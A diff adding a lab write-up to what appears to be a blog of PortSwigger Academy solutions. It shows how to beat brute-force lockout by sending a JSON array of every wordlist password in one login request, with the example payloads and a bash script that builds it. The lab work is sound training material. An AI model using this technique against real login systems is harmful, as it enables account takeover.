@@ -242,6 +242,59 @@ Wait for 1 minute, and log in on the website with the found username and passwor
   * Perform a sniper attack with a regex grep-extract
 {: .prompt-info}
 
+## LAB: Broken brute-force protection, multiple credentials per request
+
+We only have a valid username 'carlos'.\
+And as the title says, we need to be able to check multiple credentials per request.\
+Same as previous labs, if we try a random password and attempt to login as carlos multiple times, we are locked out for 1 minute.
+
+Capturing the login request via Burp, and we can see that there is something different than in other labs.\
+The post-data is not just `username=carlos&password=test`, but it's in a json object format:\
+```json
+{
+   "username": "carlos",
+   "password": "test"
+}
+```
+{: .nolineno}
+
+This info, together with the hint in the title, points me towards using an array of passwords or an array of usernames/passwords instead of a single username/password.\
+I first wanted to check if this worked or not, by passing this as the post-data:\
+```json
+{
+   "username": "carlos",
+   "password": [
+      "password1",
+      "password2",
+      "password3"
+   ]
+}
+```
+{: .nolineno}
+Which at least didn't gave an error, so that's worth a shot.
+
+Wrote a little script that generated the payload:\
+```bash
+#!/bin/bash
+
+PWFILE="/usr/share/wordlists/portswigger/portswigger-passwords.txt"
+
+
+echo '{'
+echo '  "username": "carlos",'
+echo '  "password": [ '
+for pw in $(cat ${PWFILE}); do
+  echo "    \"${pw}\","
+done
+echo '    "test"'
+echo '  ]'
+echo '}'
+```
+{:. nolineno}
+
+And then intercepted a new login attempt with Burp, changed the payload to the output of this script, and forwarded it to the browser.\
+Lab solved.
+
 
 ## Credits
 
